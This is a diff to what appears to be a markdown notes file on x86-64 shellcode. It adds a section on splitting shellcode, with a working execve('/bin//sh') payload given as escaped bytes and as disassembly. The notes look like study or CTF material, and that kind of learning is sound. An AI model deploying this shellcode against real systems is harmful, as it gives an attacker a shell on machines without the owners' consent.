@@ -47,6 +47,28 @@ pop rax
 syscall
 ```
 
+
+## Splitting our Shellcode
+
+```
+Python Escaped:
+"\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\xEB\x04\x54\x6A\x3B\x58\x31\xD2\x0F\x05"
+
+Disassembly:
+0:  31 f6                   xor    esi,esi
+2:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
+9:  2f 73 68
+c:  56                      push   rsi
+d:  53                      push   rbx
+e:  eb 04                   jmp    14 <_main+0x14>
+10: 54                      push   rsp
+11: 6a 3b                   push   0x3b
+13: 58                      pop    rax
+14: 31 d2                   xor    edx,edx
+16: 0f 05                   syscall
+```
+
+
 ## Templates & Helpful cmds
 
 rdi -> first arg
